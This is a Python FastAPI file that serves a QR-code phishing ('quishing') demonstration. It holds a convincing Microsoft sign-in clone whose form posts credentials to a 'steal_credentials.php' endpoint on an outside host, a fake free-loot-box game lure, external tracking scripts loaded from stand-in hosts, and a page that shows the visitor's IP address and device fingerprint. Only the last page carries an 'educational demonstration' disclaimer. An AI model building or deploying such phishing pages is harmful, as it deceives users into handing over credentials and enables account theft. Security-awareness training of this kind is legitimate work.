import socket
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import uvicorn

app = FastAPI()

def get_local_ip():
    """Fetches the local Wi-Fi / Ethernet IP so phones can scan the QR code."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

LOCAL_IP = get_local_ip()

@app.get("/auth-portal/microsoft-online", response_class=HTMLResponse)
def sophisticated_phish():
    harvest_url = f"http://{LOCAL_IP}:8081/mobile-app"
    qr_image_url = f"https://api.qrserver.com/v1/create-qr-code/?size=180x180&data={harvest_url}"
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign in to your account</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f3f2f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .login-box {{ background: white; padding: 44px; width: 340px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); text-align: left; }}
            .logo {{ width: 110px; margin-bottom: 24px; }}
            h2 {{ font-size: 24px; color: #1b1b1b; margin-bottom: 16px; font-weight: 600; }}
            input[type="email"], input[type="password"] {{ width: 100%; padding: 10px; margin: 8px 0 16px 0; border: none; border-bottom: 1px solid #777; outline: none; font-size: 15px; box-sizing: border-box; }}
            .btn {{ background-color: #0067b8; color: white; border: none; padding: 10px 32px; font-size: 15px; cursor: pointer; float: right; font-weight: bold; margin-bottom: 20px;}}
            .qr-section {{ text-align: center; border-top: 1px solid #ccc; padding-top: 20px; clear: both; }}
            .qr-section p {{ font-size: 14px; color: #333; }}
        </style>
        <script src="http://telemetry-tracker.xyz/log.js"></script>
    </head>
    <body>
        <div class="login-box">
            <svg class="logo" viewBox="0 0 150 24" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7fba00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00a4ef"/>
                <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
                <text x="32" y="18" font-family="'Segoe UI', Arial" font-size="20" fill="#737373" font-weight="600">Microsoft</text>
            </svg>
            <h2>Sign in</h2>
            
            <form action="http://microsoft-auth-secure.xyz/steal_credentials.php" method="POST">
                <input type="email" placeholder="Email, phone, or Skype" required>
                <input type="password" placeholder="Password" required>
                <button type="submit" class="btn">Sign in</button>
            </form>

            <div class="qr-section">
                <p><strong>Sign in securely with your mobile device</strong></p>
                <p style="font-size: 12px; color: #666;">Scan this QR code with your smartphone camera to authenticate instantly.</p>
                <img src="{qr_image_url}" alt="Malicious QR Code" />
            </div>
        </div>
    </body>
    </html>
    """
    return html_content

@app.get("/play/krunker-arena", response_class=HTMLResponse)
def gaming_social_engineering():
    # A realistic gaming background with a highly enticing "Loot Box" / "Crossplay" QR Code popup!
    harvest_url = f"http://{LOCAL_IP}:8081/mobile-app"
    qr_image_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={harvest_url}"
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>FPS Arena - Play Now!</title>
        <style>
            body {{
                margin: 0;
                overflow: hidden;
                font-family: 'Impact', 'Arial Black', sans-serif;
                background: url('https://media.giphy.com/media/VbO8zX6G5sVzO/giphy.gif') no-repeat center center fixed; 
                background-size: cover;
            }}
            .overlay {{
                position: absolute; top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(0, 0, 0, 0.6);
                display: flex; justify-content: center; align-items: center;
                animation: fadeIn 1.5s;
            }}
            .popup {{
                background: linear-gradient(135deg, #111, #333);
                border: 3px solid #f90;
                border-radius: 12px;
                padding: 30px;
                text-align: center;
                color: white;
                box-shadow: 0px 0px 30px #f90;
                width: 400px;
                animation: slideDown 0.8s ease-out;
            }}
            .popup h1 {{ color: #f90; font-size: 32px; margin: 0 0 10px 0; text-transform: uppercase; text-shadow: 2px 2px 0 #000; }}
            .popup p {{ font-family: 'Arial', sans-serif; font-size: 16px; margin-bottom: 20px; color: #ddd; }}
            .highlight {{ color: #0f0; font-weight: bold; font-size: 18px; }}
            .qr-container {{
                background: white; padding: 15px; display: inline-block; border-radius: 8px; margin-bottom: 20px;
            }}
            .btn {{
                background: #f90; color: black; border: none; padding: 12px 20px; font-size: 18px; font-weight: bold;
                text-transform: uppercase; cursor: pointer; border-radius: 4px; transition: 0.2s;
            }}
            .btn:hover {{ background: #fff; box-shadow: 0 0 15px #f90; }}
            @keyframes fadeIn {{ from {{ opacity: 0; }} to {{ opacity: 1; }} }}
            @keyframes slideDown {{ from {{ transform: translateY(-50px); opacity: 0; }} to {{ transform: translateY(0); opacity: 1; }} }}
        </style>
        <script src="http://tracking-pixel.xyz/games/spy.js"></script>
    </head>
    <body>
        <div class="overlay">
            <div class="popup">
                <h1>🏆 MYSTERY LOOT BOX! 🏆</h1>
                <p>Unlock an exclusive <span class="highlight">Legendary Sniper Skin</span> and 500 KR completely FREE!</p>
                
                <div class="qr-container">
                    <img src="{qr_image_url}" alt="Claim Reward QR">
                </div>
                
                <p style="font-size: 13px;">Open your phone camera and scan to claim before the timer runs out!</p>
            </div>
        </div>
    </body>
    </html>
    """
    return html_content

@app.get("/mobile-app", response_class=HTMLResponse)
def harvest_mobile_data(request: Request):
    user_agent = request.headers.get("User-Agent", "Unknown Device")
    client_ip = request.client.host
    accept_language = request.headers.get("Accept-Language", "Unknown")
    
    device_type = "Smartphone/Computer"
    if "iPhone" in user_agent: device_type = "Apple iPhone"
    elif "Android" in user_agent: device_type = "Android Device"
    elif "Windows" in user_agent: device_type = "Windows PC"
    elif "Macintosh" in user_agent: device_type = "Apple Mac"

    harvest_html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ font-family: Courier, monospace; background-color: #000; color: #0f0; padding: 20px; }}
            h1 {{ color: #ff3333; border-bottom: 2px solid #ff3333; }}
            .data {{ font-size: 16px; margin: 10px 0; background: #111; padding: 10px; border-left: 4px solid #0f0; }}
            .warning {{ color: #ffaa00; margin-top: 30px; font-size: 12px; }}
        </style>
    </head>
    <body>
        <h1>⚠️ QUISHING ATTACK SUCCESSFUL ⚠️</h1>
        <p>You scanned a malicious QR code. If this were a real attack, a Silent Malware Payload could have been deployed to your internal storage, or you would be prompted to enter your credentials.</p>
        
        <h2>Passive Data Harvested Instantly:</h2>
        <div class="data"><strong>Target IP Address:</strong> {client_ip}</div>
        <div class="data"><strong>Target Device OS:</strong> {device_type}</div>
        <div class="data"><strong>System Language Settings:</strong> {accept_language}</div>
        <div class="data"><strong>Raw User-Agent Fingerprint:</strong><br><br>{user_agent}</div>
        
        <p class="warning">EDUCATIONAL DEMONSTRATION ONLY. ALL DATA IS RENDERED LOCALLY AND HAS NOT BEEN TRANSMITTED OR SAVED ANYWHERE. PLEASE CLOSE THIS BROWSER WINDOW.</p>
    </body>
    </html>
    """
    return harvest_html

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8081)
